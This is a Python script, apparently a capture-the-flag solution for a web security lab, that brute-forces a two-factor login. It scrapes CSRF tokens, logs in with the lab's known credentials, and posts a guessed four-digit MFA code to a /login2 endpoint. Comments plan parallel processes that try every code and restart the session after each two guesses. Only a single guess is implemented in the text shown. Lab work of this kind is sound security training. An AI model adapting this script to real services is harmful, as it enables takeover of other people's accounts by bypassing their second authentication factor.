import sys

import requests
from bs4 import BeautifulSoup


# Login to user we have credentials for.
def login(uname, pw, csrf_token):
    login_data = {
        'csrf': csrf_token,
        'username': uname,
        'password': pw
    }
    print(f'Logging in as carlos:montoya')
    response = s.post(login_url, data=login_data)
    print(f'Login response: {response.text}')
    return response.text


# Use BeautifulSoup's html parser to grab the csrf token from some html string
def parse_tree_for_csrf(text):
    parser = BeautifulSoup(text, 'html.parser')
    return parser.find('input', {'name': 'csrf'}).get('value')


# Start script
# ------------------------

# Pull site info from cli args -- drop https:// if included
try:
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
    raise IndexError("Missing ctf site url in command line arguments.\n")

# First:
# GET login page to find value of cross-site request forgery token.
s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
csrf = parse_tree_for_csrf(resp.text)

# Then: Grab response after successful login to grab the csrf token for interaction with 2fa login page
#       Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
response_text = login('carlos', 'montoya', csrf)
csrf = parse_tree_for_csrf(response_text)

# Send auth request to 2fa endpoint with csrf token and '0000'
# Here's where we can split multiple processes that will all call a function
# that makes this post with a different 4-digit code each time.
login2_url = f'https://{site}/login2'
login2data = {
    'csrf': csrf,
    'mfa-code': str(0).zfill(4)
}
resp = s.post(login2_url, data=login2data, allow_redirects=False)
if resp.status_code == 302:
    print(f'2fa valid with response code {resp.status_code}')
    # Visit account profile page to complete level
else:
    print(f'2fa invalid with response code: {resp.status_code}')
